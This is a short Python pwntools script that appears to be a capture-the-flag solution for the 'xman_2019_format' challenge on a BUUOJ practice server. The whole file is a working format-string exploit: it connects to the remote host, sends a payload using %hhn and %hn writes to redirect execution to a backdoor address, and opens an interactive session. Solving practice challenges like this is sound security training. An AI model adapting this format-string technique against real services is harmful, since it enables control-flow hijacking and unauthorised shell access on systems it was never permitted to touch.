#coding:utf8
from pwn import *
#p = process("./xman_2019_format")
p = remote("node3.buuoj.cn",29832)

backdoor = 0x080485AB
 
payload = '%' + str(0x3C) + 'c%10$hhn|'
payload += '%' + str(backdoor & 0xFFFF) + 'c%18$hn|'

#payload = "aaaa"
#gdb.attach(p,"b *0x08048606")
p.sendafter('...',payload)


p.interactive()